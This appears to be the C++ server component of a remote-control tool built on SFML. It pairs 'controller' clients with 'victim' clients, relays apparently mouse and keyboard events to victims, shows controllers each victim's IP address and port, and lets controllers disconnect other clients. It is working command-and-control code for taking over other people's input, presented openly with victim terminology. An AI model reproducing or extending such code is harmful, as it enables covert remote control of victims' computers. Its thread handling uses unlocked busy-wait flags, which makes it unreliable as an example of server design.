#include "server.h"

Server::Server()
{
	if (listener.listen(PORT) != sf::Socket::Done) {
		std::cout << "listening failed\n";
		std::exit(-1);
	}	
	selector.add(listener);
	std::cout << "listening on port " << PORT << "\n";

	std::thread checkAwakeThread(&Server::checkAwake, this);
	checkAwakeThread.detach();
}
void Server::receive()
{
	if (!selector.wait())
		return;

	while (!canReceive) {}
	isReceiving = true;

	//check if a client has received something
	for (auto& c : clients) {
		if (!selector.isReady(*c.second.socket))
			continue;

		sf::Packet p;
		c.second.socket->receive(p);

		//disconnect client
		if (p.getDataSize() == 0) {
			std::cout << "disconnected ";
			disconnect(c.first);
			break;
		}

		c.second.lastMsg = Mlib::getTime();

		//process packet according to sender's role
		if (c.second.role == 'c')
			processControllerMsg(c.first, p);
		else if (c.second.role == 'v')
			processVictimMsg(c.first, p);
		else if (c.second.role == '-') {
			sf::Uint8 role;
			p >> role;
			p.clear();

			if (role == 'c' || role == 'v') {
				p << sf::Uint8(role);
				if (role == 'c')
					p << sf::Uint16(c.first);
				c.second.socket->send(p);
				c.second.role = role;
				std::cout << "new " << role << " - id: " << c.first << "\n";

				updateControllersList();
			}
			else {
				p << sf::Uint8('?');
				c.second.socket->send(p);
			}
		}

		return;
	}
	//check if a client is ready to connect
	if (selector.isReady(listener)) {
		Client c;
		if (listener.accept(*c.socket) == sf::Socket::Done) {
			selector.add(*c.socket);
			clients.insert({ ++currentId, c });
		}
		else {
			delete c.socket;
			currentId--;
		}
	}

	isReceiving = false;
}
void Server::checkAwake()
{
	while (true) {
		auto copy = clients;
		for (auto& c : copy) {
			if (Mlib::getTime() - c.second.lastMsg < 5'000)
				continue;

			while (isReceiving) {}
			canReceive = false;
			std::cout << "timed out ";
			disconnect(c.first);
			canReceive = true;
		}
		Mlib::sleep(10);
	}
}

void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
{
	sf::Uint8 cmd;
	p >> cmd;

	//pair controller with victim
	if (cmd == 'p') {
		sf::Uint16 vId;
		p >> vId;
		//controller is already paired
		if (clients[id].pair != 0)
			return;
		//other client doesnt exist
		if (clients.find(vId) == clients.end())
			return;
		//other client is not a victim or is already paired
		if (clients[vId].role != 'v' || clients[vId].pair != 0)
			return;

		p.clear();
		p << sf::Uint8('p');
		//tell controller that is has been paired
		clients[id].socket->send(p);

		//actually pair the 2 clients
		clients[vId].pair = id;
		clients[id].pair = vId;

		updateControllersList();
	}
	//forward events to client
	else if ((cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a')) {
		//controller is not paired
		if (clients[id].pair == 0)
			return;

		clients[clients[id].pair].socket->send(p);
	}
	//unpair controller from victim
	else if (cmd == 'u') {
		//controller is not paired
		if (clients[id].pair == 0)
			return;

		sf::Packet p;
		p << sf::Uint8('u');
		//tell controller to unpair
		clients[id].socket->send(p);

		//actually unpair the 2 clients
		clients[clients[id].pair].pair = 0;
		clients[id].pair = 0;

		updateControllersList();
	}
	//disconnect client
	else if (cmd == 'e') {
		sf::Uint16 oId;
		p >> oId;

		//client doesnt exist
		if (clients.find(oId) == clients.end())
			return;
		//client isnt initialized
		if (clients[oId].role == '-')
			return;

		std::cout << "killed ";
		disconnect(oId);
	}
}
void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
{
}

void Server::disconnect(sf::Uint8 id)
{
	sf::Packet p;
	//unpair the paired client
	if (clients[id].pair != 0) {
		//if client is controller, tell him to unpair
		if (clients[clients[id].pair].role == 'c') {
			p.clear();
			p << sf::Uint8('u');
			clients[clients[id].pair].socket->send(p);
		}
		//if client is victim, tell his to release all keys
		else if (clients[clients[id].pair].role == 'v')
		{
			p.clear();
			p << sf::Uint8('a');
			clients[clients[id].pair].socket->send(p);
		}
		
		//actually unpair other client
		clients[clients[id].pair].pair = 0;
	}
	selector.remove(*clients[id].socket);
	delete clients[id].socket;
	clients.erase(id);
	std::cout << "id: " << int(id) << "\n";
	updateControllersList();
}
void Server::updateControllersList()
{
	auto sendControllers = [this](sf::Packet p) {
		for (auto& c : clients)
		{
			if (c.second.role == 'c')
				c.second.socket->send(p);
		}
	};

	//tell controllers to clear clients list
	sf::Packet p;
	p << sf::Uint8('q');
	sendControllers(p);

	//send to controllers each client info
	for (const auto& c : clients) {
		//skip if client isnt initialized
		if (c.second.role == '-')
			continue;

		p.clear();
		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.time;
		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort();

		if (c.second.pair != 0)
			p << c.second.pair;
		else
			p << sf::Uint16(0);

		sendControllers(p);
	}

	//tell controllers to display clients list
	p.clear();
	p << sf::Uint8('d');
	sendControllers(p);
}